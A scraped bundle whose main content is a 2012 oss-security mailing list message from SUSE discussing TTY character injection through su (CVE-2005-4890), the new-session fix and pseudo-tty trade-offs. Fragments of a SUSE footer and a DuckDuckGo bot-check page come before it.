* ![WeChat](https://www.suse.com/assets/img/icons/WeChat.png)

![WeChat QR](https://www.suse.com/assets/img/icons/qrcode_for_gh_91d12717ed53_430.jpg)

Support: [Open a Support Case](https://www.suse.com/support/handbook/#open)

©  ©SUSE, All Rights Reserved

Cookie Settings

[Privacy Policy](https://www.suse.com/company/legal/) and
[Cookie Policy](https://www.suse.com/company/legal/cookies-policy/)

X

×



=== Content from duckduckgo.com_3251f6c6_20250126_050035.html ===


[DuckDuckGo](/html/)

Unfortunately, bots use DuckDuckGo too.
Please complete the following challenge to confirm this search was made by a human.
Select all squares containing a duck:

![ ](../assets/anomaly/images/challenge/efb9e03dea9c46f9a941639244745e40.jpg)

![ ](../assets/anomaly/images/challenge/3a92d77ea1c647b1b68905d12e2c6beb.jpg)

![ ](../assets/anomaly/images/challenge/23c1e3ae8ce8443183e624800acf2f47.jpg)

![ ](../assets/anomaly/images/challenge/6e2ca83055254255b64c2777c91b6c1e.jpg)

![ ](../assets/anomaly/images/challenge/2cf1c84b886c4c339792bd8029da27bc.jpg)

![ ](../assets/anomaly/images/challenge/07633caf09784bf483d94daf3b05ab41.jpg)

![ ](../assets/anomaly/images/challenge/7e27eab795fb47fe9cb9051615e56186.jpg)

![ ](../assets/anomaly/images/challenge/c77e30df86594ddaa9d43dcac463d34f.jpg)

![ ](../assets/anomaly/images/challenge/ee4c07e9c7db4f04a78d73d17afb3521.jpg)

Submit
Images not loading?
Please email the following code to:

error-lite@duckduckgo.com

Code: d4cd0dabcf4caa22ad92fab40844c786

![](//duckduckgo.com/t/tqadb?9302944&s=lite&p=efb9e03dea9c46f9a941639244745e40-3a92d77ea1c647b1b68905d12e2c6beb-23c1e3ae8ce8443183e624800acf2f47-6e2ca83055254255b64c2777c91b6c1e-2cf1c84b886c4c339792bd8029da27bc-07633caf09784bf483d94daf3b05ab41-7e27eab795fb47fe9cb9051615e56186-c77e30df86594ddaa9d43dcac463d34f-ee4c07e9c7db4f04a78d73d17afb3521&i=-1&o=UUzNDn7izdvv4rAcirzYraQnvrKei%2BBgwwfp8hTtySmhic9J0kLOv92FT0Vpp6ZF%0A&sc=1&iadb=0&c=dadb&gk=d4cd0dabcf4caa22ad92fab40844c786&r=eun&cc=botnet&e=0)


=== Content from www.openwall.com_1f9b34aa_20250125_011807.html ===


| [Openwall](/) * [Products](/)   + [Openwall GNU/\*/Linux   *server OS*](/Owl/)+ [Linux Kernel Runtime Guard](/lkrg/)+ [John the Ripper   *password cracker*](/john/)         - [Free & Open Source for any platform](/john/)- [in the cloud](/john/cloud/)- [Pro for Linux](/john/pro/linux/)- [Pro for macOS](/john/pro/macosx/)+ [Wordlists   *for password cracking*](/wordlists/)+ [passwdqc   *policy enforcement*](/passwdqc/)             - [Free & Open Source for Unix](/passwdqc/)- [Pro for Windows (Active Directory)](/passwdqc/windows/)+ [yescrypt   *KDF & password hashing*](/yescrypt/)+ [yespower   *Proof-of-Work (PoW)*](/yespower/)+ [crypt\_blowfish   *password hashing*](/crypt/)+ [phpass   *ditto in PHP*](/phpass/)+ [tcb   *better password shadowing*](/tcb/)+ [Pluggable Authentication Modules](/pam/)+ [scanlogd   *port scan detector*](/scanlogd/)+ [popa3d   *tiny POP3 daemon*](/popa3d/)+ [blists   *web interface to mailing lists*](/blists/)+ [msulogin   *single user mode login*](/msulogin/)+ [php\_mt\_seed   *mt\_rand() cracker*](/php_mt_seed/)* [Services](/services/)* Publications       + [Articles](/articles/)+ [Presentations](/presentations/)* Resources         + [Mailing lists](/lists/)+ [Community wiki](https://openwall.info/wiki/)+ [Source code repositories (GitHub)](https://github.com/openwall)+ [Source code repositories (CVSweb)](https://cvsweb.openwall.com)+ [File archive & mirrors](/mirrors/)+ [How to verify digital signatures](/signatures/)+ [OVE IDs](/ove/)* [What's new](/news) | |
| --- | --- |

| | [Follow @Openwall on Twitter for new release announcements and other news](https://twitter.com/openwall) | | --- | |
| --- | --- |

[[<prev]](7) [[next>]](9) [[<thread-prev]](6) [[thread-next>]](11) [[day]](.) [[month]](..) [[year]](../..) [[list]](../../..)
```

Message-ID: <20121106140657.GF31783@suse.de>
Date: Tue, 6 Nov 2012 15:06:57 +0100
From: Marcus Meissner <meissner@...e.de>
To: oss-security@...ts.openwall.com, disclosure@....org
Subject: Re: Re: TTY handling when executing code in
	different lower-privileged context (su, virt containers)

On Wed, Nov 07, 2012 at 12:37:25AM +1100, David Black wrote:
> >In both cases, paranoid administrators might decide to use /dev/null
> >as stdin/stdout/stderr when just starting non-interactive programs in
> >different context, while they could replace the privileged shell with
> >exec when interactive context switch is needed (no shell, no escalation).
> >
> >Any opinions on that?
> >
>
>
> Perhaps if sudo/su determine if a user is running 'interactively' they
> could use a pseudo-pty ?

There were fixes released btw ...  (If we are talking about the same
problem.)

SUSE at least did release fixes for the terminal character injection,
by opening a new session.

(CVE-2005-4890 is this whole issue I think.)

Ludwig Nussel tried to also use pseudo tty, but this gets kind of
messy soon, especially if you start with the signal handling required
(ctrl-z and ctrl-c over su are supposed to work...).

Fun enough, after release one of our customers reported to actually use
code like:

	su nobody -c "echo Test >/dev/tty"

Ciao, Marcus

```

[Powered by blists](https://www.openwall.com/blists/) - [more mailing lists](https://lists.openwall.net)

Please check out the
[Open Source Software Security Wiki](https://oss-security.openwall.org/wiki/), which is counterpart to this
[mailing list](https://oss-security.openwall.org/wiki/mailing-lists/oss-security).

Confused about [mailing lists](/lists/) and their use?
[Read about mailing lists on Wikipedia](https://en.wikipedia.org/wiki/Electronic_mailing_list)
and check out these
[guidelines on proper formatting of your messages](https://www.complang.tuwien.ac.at/anton/mail-news-errors.html).


